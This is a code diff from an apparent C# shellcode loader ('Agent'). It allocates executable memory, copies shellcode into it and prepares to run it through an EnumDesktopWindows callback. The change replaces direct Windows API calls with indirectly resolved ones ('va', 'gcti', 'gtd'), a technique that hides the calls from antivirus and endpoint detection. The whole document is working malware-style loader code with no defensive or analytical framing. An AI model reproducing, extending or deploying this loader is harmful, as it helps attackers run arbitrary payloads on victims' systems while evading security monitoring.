@@ -54,9 +54,11 @@ namespace Agent
 
             //Injection
 
-            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+            //Allocate Memory for shellcode
+            //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
-            //IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
+            IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
 
             if (funcAddr == IntPtr.Zero)
             {
@@ -65,23 +67,21 @@ namespace Agent
             }
             Console.WriteLine("Allocated memory at: " + funcAddr);
 
+
+            //Copy shellcode to allocated memory
             Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
+
+            //Create our EnumDesktopWindowsProc delegate
             var funcDelegate = Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(EnumDesktopWindowsProc));
 
+            //Get current thread ID
             //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); 
-            object[] gctParams = new object[] { }; // No parameters for GetCurrentThreadId
+            object[] gctParams = Array.Empty<object>(); // No parameters for GetCurrentThreadId
             uint threadId = Generic.InvokeFunc<uint>(Resolver.GetFunc("gcti"), typeof(GCTDelegate), ref gctParams);
 
-            object[] gtdParams = new object[] { threadId }; // GetThreadDesktop takes the thread ID
+            //Get the current Desktop for the thread ID
+            object[] gtdParams = [threadId]; // GetThreadDesktop takes the thread ID
             IntPtr hDesktop = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("gtd"), typeof(GTDDelegate), ref gtdParams);
-
-
-
-
-
-
-
-
 
             if (hDesktop == IntPtr.Zero)
             {
